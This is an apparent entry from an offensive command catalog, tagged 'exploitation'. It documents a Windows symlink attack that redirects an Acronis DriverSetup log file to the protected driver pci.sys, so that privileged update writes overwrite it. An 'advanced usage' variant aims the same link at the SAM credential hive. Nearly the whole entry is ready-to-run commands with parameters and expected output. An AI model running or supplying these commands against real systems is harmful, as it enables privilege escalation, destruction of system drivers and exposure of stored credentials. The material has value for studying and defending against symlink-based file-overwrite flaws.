---
id: cmd-createsymlink-log
data: >-
  CreateSymlink %temp%\Acronis\DriverSetup\inst.log
  C:\Windows\System32\drivers\pci.sys
tags:
  - symlink
  - exploitation
type: command
output: Success message or no output
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.734Z'
verified: false
validated: true
submitted: true
---
# CreateSymlink-create-log-symlink

## Command

```cmd
CreateSymlink %temp%\Acronis\DriverSetup\inst.log C:\Windows\System32\drivers\pci.sys
```

## Description

Uses the CreateSymlink tool to establish a symbolic link from the Acronis log path to a protected system driver, enabling overwrite during privileged update writes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| %temp%\Acronis\DriverSetup\inst.log | Source symlink path (log file location) | Yes |
| C:\Windows\System32\drivers\pci.sys | Target protected file to link to | Yes |

## Examples

### Basic Usage

```cmd
CreateSymlink %temp%\Acronis\DriverSetup\inst.log C:\Windows\System32\drivers\pci.sys
```

### Advanced Usage

Target a different file: ```cmd
CreateSymlink %temp%\Acronis\DriverSetup\inst.log C:\Windows\System32\config\SAM
```

## Expected Output

Tool-specific success message (e.g., "Symlink created successfully") or no output; verify with dir /aL on the source path.

## Related

- [[tools/CreateSymlink]]
